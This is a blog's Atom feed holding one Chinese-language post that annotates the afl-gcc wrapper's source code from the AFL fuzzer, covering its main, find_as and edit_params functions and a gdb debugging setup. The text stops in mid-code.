<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>starrysky</title>
  
  <subtitle>starrysky&#39;s zone</subtitle>
  <link href="https://starrysky1004.github.io/atom.xml" rel="self"/>
  
  <link href="https://starrysky1004.github.io/"/>
  <updated>2025-02-24T07:28:49.295Z</updated>
  <id>https://starrysky1004.github.io/</id>
  
  <author>
    <name>starrysky</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>AFL源码分析（一）</title>
    <link href="https://starrysky1004.github.io/2025/02/24/afl-yuan-ma-fen-xi-yi/afl-yuan-ma-fen-xi-yi/"/>
    <id>https://starrysky1004.github.io/2025/02/24/afl-yuan-ma-fen-xi-yi/afl-yuan-ma-fen-xi-yi/</id>
    <published>2025-02-24T07:25:16.000Z</published>
    <updated>2025-02-24T07:28:49.295Z</updated>
    
    <content type="html"><![CDATA[<h2 id="afl-gcc"><a href="#afl-gcc" class="headerlink" title="afl-gcc"></a>afl-gcc</h2><h3 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h3><p>test.c源码</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello World!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>gdb载入源码调试</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$gdb</span> <span class="token punctuation">..</span>/AFL/afl-gccpwndbg<span class="token operator">></span> <span class="token builtin class-name">set</span> args test.c <span class="token parameter variable">-o</span> <span class="token builtin class-name">test</span>pwndbg<span class="token operator">></span> <span class="token function">dir</span> <span class="token punctuation">..</span>/AFLpwndbg<span class="token operator">></span> b mainpwndbg<span class="token operator">></span> r<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><ul><li>输出版本信息</li><li>判断没有参数就退出</li><li>获取 afl-as 路径</li><li>调用 edit_params 解析参数</li><li>根据解析出的参数使用 execvp 执行 gcc</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isatty</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_QUIET"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//标准错误输出 stderr 定向到终端且 AFL_QUIET 环境变量不存在</span>    <span class="token function">SAYF</span><span class="token punctuation">(</span>cCYA <span class="token string">"afl-cc "</span> cBRI VERSION cRST <span class="token string">" by &lt;lcamtuf@google.com>\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出 AFL 的版本信息</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> be_quiet <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//如果标准错误输出 stderr 重定向到其他位置，或者 AFL_QUIET 环境变量存在，则设置 be_quiet = 1</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//如果 afl-gcc 后面没有参数则输出报错后退出</span>    <span class="token function">SAYF</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span> BIN_PATH<span class="token punctuation">,</span> BIN_PATH<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">find_as</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//寻找 afl-as 的位置</span>  <span class="token function">edit_params</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//解析参数</span>  <span class="token function">execvp</span><span class="token punctuation">(</span>cc_params<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>cc_params<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//执行参数列表中的指令,通过 -B 指定使用 afl-as 进行汇编来编译插桩</span>  <span class="token comment">//最终执行参数: gcc test.c -o test -B /home/starrysky/AFL -g -O3 -funroll-loops -D__AFL_COMPILER=1 -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1</span>  <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Oops, failed to execute '%s' - check your PATH"</span><span class="token punctuation">,</span> cc_params<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//解析失败报错</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="find-as"><a href="#find-as" class="headerlink" title="find_as"></a>find_as</h3><ul><li>通过环境变量中的 AFL_PATH 找 afl-as</li><li>如果没有就在 afl-gcc 所在目录里找 afl-as</li><li>再次去 AFL_PATH 中找 afl-as 找到就改成 AFL_PATH 中的 afl-as</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">find_as</span><span class="token punctuation">(</span>u8<span class="token operator">*</span> argv0<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  u8 <span class="token operator">*</span>afl_path <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_PATH"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取环境变量中的 AFL_PATH</span>  u8 <span class="token operator">*</span>slash<span class="token punctuation">,</span> <span class="token operator">*</span>tmp<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>afl_path<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//环境变量中存在 AFL_PATH</span>    tmp <span class="token operator">=</span> <span class="token function">alloc_printf</span><span class="token punctuation">(</span><span class="token string">"%s/as"</span><span class="token punctuation">,</span> afl_path<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">access</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span> X_OK<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// AFL_PATH / as 可访问</span>      as_path <span class="token operator">=</span> afl_path<span class="token punctuation">;</span><span class="token comment">// as_path 设置为环境变量中的 AFL_PATH</span>      <span class="token function">ck_free</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">ck_free</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  slash <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span>argv0<span class="token punctuation">,</span> <span class="token char">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取当前执行的 afl-gcc 程序路径字符串中“/”字符最后一次出现的位置,本例中"../AFL/afl-gcc"则指向"AFL/"后的"/"</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>slash<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    u8 <span class="token operator">*</span>dir<span class="token punctuation">;</span>    <span class="token operator">*</span>slash <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    dir <span class="token operator">=</span> <span class="token function">ck_strdup</span><span class="token punctuation">(</span>argv0<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span>slash <span class="token operator">=</span> <span class="token char">'/'</span><span class="token punctuation">;</span>    tmp <span class="token operator">=</span> <span class="token function">alloc_printf</span><span class="token punctuation">(</span><span class="token string">"%s/afl-as"</span><span class="token punctuation">,</span> dir<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">access</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span> X_OK<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// ../AFL/afl-as 可访问</span>      as_path <span class="token operator">=</span> dir<span class="token punctuation">;</span><span class="token comment">// as_path 设置为 ../AFL/afl-as</span>      <span class="token function">ck_free</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">ck_free</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ck_free</span><span class="token punctuation">(</span>dir<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">access</span><span class="token punctuation">(</span>AFL_PATH <span class="token string">"/as"</span><span class="token punctuation">,</span> X_OK<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//第一次检查的时候可能是 NULL,再检查一遍 AFL_PATH / as 是否可访问</span>    as_path <span class="token operator">=</span> AFL_PATH<span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Unable to find AFL wrapper binary for 'as'. Please set AFL_PATH"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="edit-params"><a href="#edit-params" class="headerlink" title="edit_params"></a>edit_params</h3><p>处理 afl-fuzz 的参数，将参数存放到 cc_params[]</p><ul><li><p>根据 afl 指令选择对应的编译器存放到 cc_params[0]：afl-gcc &#x2F; afl-g++ &#x2F; afl-clang &#x2F; afl-clang++ &#x2F; afl-gcj &#x3D;&gt; gcc &#x2F; g++ &#x2F; clang &#x2F; clang++ &#x2F; gcj</p></li><li><p>循环解析参数并添加到参数列表数组中并设置相应的环境变量</p><ul><li><blockquote><ul><li>跳过 -B 后面的参数</li><li>跳过 -integrated-as 和 -pipe</li><li>-m32：设置 m32_set &#x3D; 1</li><li>存在 -fsanitize&#x3D;address  或 -fsanitize&#x3D;memory 设置 asan_set &#x3D; 1</li><li>存在 FORTIFY_SOURCE 设置 fortify_set &#x3D; 1</li></ul></blockquote></li><li><p>将当前参数存放到 cc_params 参数数组中</p></li></ul></li><li><p>附加参数：</p><ul><li>-B as_path</li><li>-O3：启用一系列优化措施，以提高程序的运行速度和效率</li><li>-funroll-loops：启用循环展开优化减少循环控制的开销</li><li>-D__AFL_COMPILER&#x3D;1：指示编译器正在使用 AFL</li><li>-DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION&#x3D;1：指示当前的编译模式是为模糊测试准备的，而不是用于生产环境</li></ul></li><li><p>在一定条件下附加参数：</p><ul><li><p>是 clang 模式：加上参数 -no-integrated-as，禁用 Clang 的内置汇编器</p></li><li><p>存在全局变量 AFL_HARDEN ：加上参数 -fstack-protector-all，启用堆栈保护，即canary</p></li><li><p>fortify_set &#x3D; 1：加上参数 -D_FORTIFY_SOURCE&#x3D;2，增强标准库函数的安全性，检查标准库函数（如 memcpy、strcpy 等）的参数是否可能导致缓冲区溢出</p></li><li><p>存在参数 -fsanitize&#x3D;address  或 -fsanitize&#x3D;memory：设置环境变量 AFL_USE_ASAN 为 1</p></li><li><p>存在环境变量 AFL_USE_ASAN &#x2F; AFL_USE_MSAN</p><ul><li>同时存在环境变量 AFL_USE_MSAN &#x2F; AFL_HARDEN 则报错</li><li>参数加上 -U_FORTIFY_SOURCE 和 -fsanitize&#x3D;address</li></ul></li><li><p>不是 FreeBSD 系统：加 -g 在编译时生成调试信息</p></li><li><p>存在环境变量 AFL_NO_BUILTIN ：附加一系列参数禁用编译器对一系列 str 和 cmp 类函数的内置优化，确保使用标准库中定义的strcmp函数</p></li></ul></li><li><p>在参数列表末尾加上 NULL 表示结束</p></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">edit_params</span><span class="token punctuation">(</span>u32 argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  u8 fortify_set <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> asan_set <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  u8 <span class="token operator">*</span>name<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression"><span class="token function">defined</span><span class="token punctuation">(</span>__FreeBSD__<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">defined</span><span class="token punctuation">(</span>__x86_64__<span class="token punctuation">)</span></span></span>  u8 m32_set <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>  cc_params <span class="token operator">=</span> <span class="token function">ck_alloc</span><span class="token punctuation">(</span><span class="token punctuation">(</span>argc <span class="token operator">+</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>u8<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//为 cc_params 开辟空间,本例中 argc = 4</span>  name <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token char">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//找到最后一个"/"的位置,也就是"../AFL/afl-gcc"中的第二个"/"位置</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>name<span class="token punctuation">)</span> name <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">else</span> name<span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment">//如果存在"/",则 name 为"/"下一个位置即"afl-gcc",如果不存在也就是直接使用了 AFL_PATH 中的 afl-gcc 则 name 直接等于 argv[0]</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token string">"afl-clang"</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//判断是否为 afl-clang</span>    clang_mode <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token function">setenv</span><span class="token punctuation">(</span>CLANG_ENV_VAR<span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//是 afl-clang 则设置 clang_mode = 1 且设置环境变量 CLANG_ENV_VAR 为 1</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token string">"afl-clang++"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//进一步判断是否是 afl-clang++</span>      u8<span class="token operator">*</span> alt_cxx <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_CXX"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      cc_params<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> alt_cxx <span class="token operator">?</span> alt_cxx <span class="token operator">:</span> <span class="token punctuation">(</span>u8<span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"clang++"</span><span class="token punctuation">;</span><span class="token comment">//是 afl-clang++ 则设置 cc_params[0] 为环境变量里的 AFL_CXX 或者 clang++</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      u8<span class="token operator">*</span> alt_cc <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_CC"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      cc_params<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> alt_cc <span class="token operator">?</span> alt_cc <span class="token operator">:</span> <span class="token punctuation">(</span>u8<span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"clang"</span><span class="token punctuation">;</span><span class="token comment">//是 afl-clang 则设置 cc_params[0] 为环境变量里的 AFL_CC 或者 clang</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">__APPLE__</span><span class="token comment">//如果是苹果平台</span></span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span><span class="token comment">//本例是在linux, 最终 cc_params[0] = gcc</span></span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token string">"afl-g++"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//如果是 afl-g++ 则设置 cc_params[0] 为环境变量中 AFL_CXX 的值或 g++</span>      u8<span class="token operator">*</span> alt_cxx <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_CXX"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      cc_params<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> alt_cxx <span class="token operator">?</span> alt_cxx <span class="token operator">:</span> <span class="token punctuation">(</span>u8<span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"g++"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token string">"afl-gcj"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//如果是 afl-gcj 则设置 cc_params[0] 为环境变量中 "AFL_GCJ 的值或 gcj,用于编译 java</span>      u8<span class="token operator">*</span> alt_cc <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_GCJ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      cc_params<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> alt_cc <span class="token operator">?</span> alt_cc <span class="token operator">:</span> <span class="token punctuation">(</span>u8<span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"gcj"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token comment">//如果是其他指令, 设置 cc_params[0] 为环境变量中 "AFL_CC 的值或 gcc</span>      u8<span class="token operator">*</span> alt_cc <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_CC"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      cc_params<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> alt_cc <span class="token operator">?</span> alt_cc <span class="token operator">:</span> <span class="token punctuation">(</span>u8<span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"gcc"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> <span class="token comment">/* __APPLE__ */</span></span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">--</span>argc<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//第一个参数处理完参数数量减1,遍历其他参数</span>    u8<span class="token operator">*</span> cur <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">++</span>argv<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取下一个参数的位置</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>cur<span class="token punctuation">,</span> <span class="token string">"-B"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//处理参数 -B,用于指定工具链或库文件的参数,这里会跳过 -B 和它的值</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>be_quiet<span class="token punctuation">)</span> <span class="token function">WARNF</span><span class="token punctuation">(</span><span class="token string">"-B is already set, overriding"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//be_quiet 为 0 则提示已经设置过</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>cur<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> argc <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> argc<span class="token operator">--</span><span class="token punctuation">;</span> argv<span class="token operator">++</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token comment">//跳过 -B 后面的参数</span>      <span class="token keyword">continue</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>cur<span class="token punctuation">,</span> <span class="token string">"-integrated-as"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token comment">//跳过参数 -integrated-as</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>cur<span class="token punctuation">,</span> <span class="token string">"-pipe"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token comment">//跳过参数 -pipe</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression"><span class="token function">defined</span><span class="token punctuation">(</span>__FreeBSD__<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">defined</span><span class="token punctuation">(</span>__x86_64__<span class="token punctuation">)</span></span><span class="token comment">//如果是 FreeBSD 系统并且是 x86-64架构,本例中不是</span></span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>cur<span class="token punctuation">,</span> <span class="token string">"-m32"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> m32_set <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>cur<span class="token punctuation">,</span> <span class="token string">"-fsanitize=address"</span><span class="token punctuation">)</span> <span class="token operator">||</span>        <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>cur<span class="token punctuation">,</span> <span class="token string">"-fsanitize=memory"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> asan_set <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//存在 -fsanitize=address  或 -fsanitize=memory 则设置 asan_set = 1</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span>cur<span class="token punctuation">,</span> <span class="token string">"FORTIFY_SOURCE"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> fortify_set <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//存在 FORTIFY_SOURCE 则设置 fortify_set = 1</span>    cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> cur<span class="token punctuation">;</span><span class="token comment">//将当前参数存到 cc_params 数组中</span>  <span class="token punctuation">&#125;</span>  cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"-B"</span><span class="token punctuation">;</span>  cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> as_path<span class="token punctuation">;</span><span class="token comment">//参数数组增加 -B as_path 指定 afl-as 位置</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>clang_mode<span class="token punctuation">)</span><span class="token comment">//如果是 clang 模式则加上参数 -no-integrated-as,禁用 Clang 的内置汇编器</span>    cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"-no-integrated-as"</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_HARDEN"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//如果存在全局变量 AFL_HARDEN 则加上参数 -fstack-protector-all,启用堆栈保护,即canary</span>    cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"-fstack-protector-all"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>fortify_set<span class="token punctuation">)</span><span class="token comment">//如果 fortify_set = 1 再加上参数 -D_FORTIFY_SOURCE=2,增强标准库函数的安全性,检查标准库函数（如 memcpy、strcpy 等）的参数是否可能导致缓冲区溢出</span>      cc_params<span class="token punctuation">[</span>cc_par_cnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"-D_FORTIFY_SOURCE=2"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>asan_set<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//存在参数 -fsanitize=address  或 -fsanitize=memory </span>    <span class="token comment">/* Pass this on to afl-as to adjust map density.将其传递给 afl-as 来调整 map density */</span>    <span class="token function">setenv</span><span class="token punctuation">(</span><span class="token string">"AFL_USE_ASAN"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置环境变量 AFL_USE_ASAN 为 1</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_USE_ASAN"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//如果存在环境变量 AFL_USE_ASAN</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_USE_MSAN"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"ASAN and MSAN are mutually exclusive"</span><span 